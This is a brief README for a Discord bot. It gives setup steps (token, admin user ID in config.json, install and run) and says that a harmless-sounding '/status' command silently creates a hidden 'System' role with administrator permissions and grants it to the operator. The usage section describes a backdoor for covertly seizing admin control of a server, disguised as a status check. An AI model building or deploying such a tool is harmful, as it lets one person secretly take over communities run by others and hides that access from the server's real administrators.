# Setup

1. Get bot token from [Discord Developer Portal](https://discord.com/developers/applications)
2. Enable Developer Mode in Discord → Right-click your profile → Copy ID
3. Update `config.json` with your TOKEN and ADMIN_USER_ID
4. Install dependencies: `pip install -r requirements.txt`
5. Run: `python bot.py`

## Usage

Use `/status` in Discord. The bot will create a hidden role "System" with admin permissions and assign it to you. Only your ID can use this command.
